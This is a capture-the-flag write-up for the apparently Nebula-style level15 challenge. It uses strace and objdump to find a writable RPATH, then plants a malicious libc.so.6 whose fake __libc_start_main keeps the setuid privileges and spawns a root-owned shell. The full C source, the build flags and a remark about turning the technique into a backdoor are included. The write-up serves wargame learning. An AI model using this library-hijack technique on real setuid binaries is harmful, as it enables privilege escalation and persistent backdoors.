# level15

## Challenge info

strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.<br>

You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.<br>

Clean up after yourself :)<br>

To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15.<br>

## Solution

After running strace at the binary we got 

```
execve("./flag15", ["./flag15"], [/* 20 vars */]) = 0
brk(0)                                  = 0x9bf6000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7874000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/tmp/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/i686/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/tmp/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/i686/sse2", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/tmp/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/i686/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/tmp/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/i686", 0xbfd70064)     = -1 ENOENT (No such file or directory)
open("/tmp/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/tmp/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/sse2", 0xbfd70064)     = -1 ENOENT (No such file or directory)
open("/tmp/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/tls/cmov", 0xbfd70064)     = -1 ENOENT (No such file or directory)
open("/tmp/tls/libc.so.6", O_RDONLY)    = -1 ENOENT (No such file or directory)
stat64("/tmp/tls", 0xbfd70064)          = -1 ENOENT (No such file or directory)
open("/tmp/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/i686/sse2/cmov", 0xbfd70064) = -1 ENOENT (No such file or directory)
open("/tmp/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/i686/sse2", 0xbfd70064)    = -1 ENOENT (No such file or directory)
open("/tmp/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/i686/cmov", 0xbfd70064)    = -1 ENOENT (No such file or directory)
open("/tmp/i686/libc.so.6", O_RDONLY)   = -1 ENOENT (No such file or directory)
stat64("/tmp/i686", 0xbfd70064)         = -1 ENOENT (No such file or directory)
open("/tmp/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/tmp/sse2/cmov", 0xbfd70064)    = -1 ENOENT (No such file or directory)
open("/tmp/sse2/libc.so.6", O_RDONLY)   = -1 ENOENT (No such file or directory)
stat64("/tmp/sse2", 0xbfd70064)         = -1 ENOENT (No such file or directory)
open("/tmp/cmov/libc.so.6", O_RDONLY)   = -1 ENOENT (No such file or directory)
stat64("/tmp/cmov", 0xbfd70064)         = -1 ENOENT (No such file or directory)
open("/tmp/libc.so.6", O_RDONLY)        = -1 ENOENT (No such file or directory)
stat64("/tmp", {st_mode=S_IFDIR|S_ISVTX|0777, st_size=80, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb786b000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x110000
mmap2(0x286000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x286000
mmap2(0x289000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x289000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb786a8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x286000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x874000, 4096, PROT_READ)     = 0
munmap(0xb786b000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7873000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11) 
```

We can see that multiple libraries are being linked at runtime, i question myself if injecting some kind of fake library at one of these files will allow to then execute another code and consequently escalate the priviliges. <br>

From the docs this seems really a thing because
```
If,  at  the  time that the program was started, the environment variable LD_LIBRARY_PATH was defined to contain a colon-separated list of directories, then these are searched.  

#### this cannot be applied because, almost certainly, the binary is setting the UID and the GID 
---> (As a security measure, this variable is ignored for set-user-ID and set-group-ID programs.)
```

we see that the binary also loads libraries from the /tmp folder... this can be a place to insert the shared library that will hijack the execution ... <br>

Also, checking the objdump we can see that the RPATH sustains my initial idea... 
```

objdump -p flag15
(...)
RPATH                /var/tmp/flag15
(...)
```

Event though it is not on the /tmp (which also works), the user level15 has rwx perms on /var/tmp/flag15 <br>

From: man dlopen
```
(ELF only) If the executable file for the calling program contains a DT_RPATH tag, and does not contain a DT_RUNPATH tag, then the directories listed in the DT_RPATH tag are searched.
```

My main idea was to redifine puts content but, and how the libc is structured that is not allowed, instead, and since the library has a main function (and is required), we can change that behaviour ! <br>

```
cmd: objdump -R flag15 

flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main <-------------- we need to redefine this in our evil libc!!
```

The crafted lib looks like following!

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){
        system("/bin/bash");

}
```

Now lets compile it!!
```
cmd: gcc -Wall -fPIC -c *.c
```

When running, we got the following error

```
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

Lets google that symbol ! <br> 
It seems a destructor for the libc... lets add it to the evil lib !! <br>

```
void __cxa_finalize (void *d){
        return;
}
```

Now we got a different error, so i assume the destructor worked ! <br>

```
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

we need to add the system function symbol !! <br> 

Since we'll need to set the uid and the gid when executing (to maintain the privileges when spawning a shell) and we need functions that we do not have (will miss symbols) let's try to statically link the evil libc to the original ! <br>

I was stuck in this compilation because it was always saying that there was no version information available for the crafted libc <br>

Turns out that it needs to be supplied some arguments to the compiler and create an auxiliar file with the version that was saying in the error (GLIBC_2.0)
```
echo "GLIBC_2.0 { };" > version

I was doing: gcc -Wall -fPIC -shared -static-libgcc libc.c -o libc.so.6
The needed: gcc -Wall -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic libc.c -o libc.so.6
```

Final code
```
#include <linux/unistd.h>
#include <sys/types.h>

void __cxa_finalize (void *d){
        return;
}

int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){
        gid_t gid;
        uid_t uid;

        gid = getegid();
        uid = geteuid();

        setresgid(gid, gid, gid);
        setresuid(uid, uid, uid);

        system("/bin/bash");
}
```

now execute the binary !! <br>

```
./flag15

whoami
flag15
getflag
```

## Flag

```
You have successfully executed getflag on a target account
```

# NOTES

The initial idea of changing puts behaviour also works (i tested), but in order to be a clean exit it needed to implement the pthread library (to acquire the lock on the FD which in this case is stdout) and that is too much work for such a challenge! <br>

It worked without the need to not calling the main function at all which (with time spent crafting the libc) would work without noticing (even creating a backdoor is a thing with this)